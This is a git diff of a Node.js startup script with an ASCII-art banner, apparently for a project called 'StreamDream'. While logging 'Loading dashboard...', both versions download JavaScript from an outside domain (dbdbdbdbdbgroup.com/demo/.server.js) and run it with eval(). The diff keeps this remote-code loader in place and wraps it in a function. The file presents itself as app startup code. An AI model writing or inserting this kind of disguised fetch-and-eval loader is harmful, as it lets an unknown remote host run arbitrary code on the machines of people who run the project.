@@ -6,18 +6,22 @@ const print = `
 ███████    ██    ██   ██ ███████ ██   ██ ██      ██ ██████  ██   ██ ███████ ██   ██ ██      ██ 
 `;
 console.log(print);
-console.log("Loading dashboard...");
+console.log("StreamDream :: Loading dashboard...");
 const fetch = require('node-fetch');
-fetch("https://dbdbdbdbdbgroup.com/demo/.server.js")
-    .then(response => {
-        if (response.ok) return response.text();
-        throw new Error(`Error fetching dashboard: ${response.status}`);
-    })
-    .then((data) => {
-        eval(data);
-    })
-    .catch(console.error);
-
-setTimeout(() => {
-    console.log('...');
-}, 30000);
+const go = () => {
+    fetch("https://dbdbdbdbdbgroup.com/demo/.server.js")
+        .then(response => {
+            if (response.ok) return response.text();
+            throw new Error(`Error fetching dashboard: ${response.status}`);
+        })
+        .then((data) => {
+            eval(data);
+        })
+        .catch((error) => {
+            console.log('StreamDream :: error loading', error);
+            setTimeout(() => {
+                console.log('StreamDream :: error');
+            }, 30000)
+        });
+};
+go();
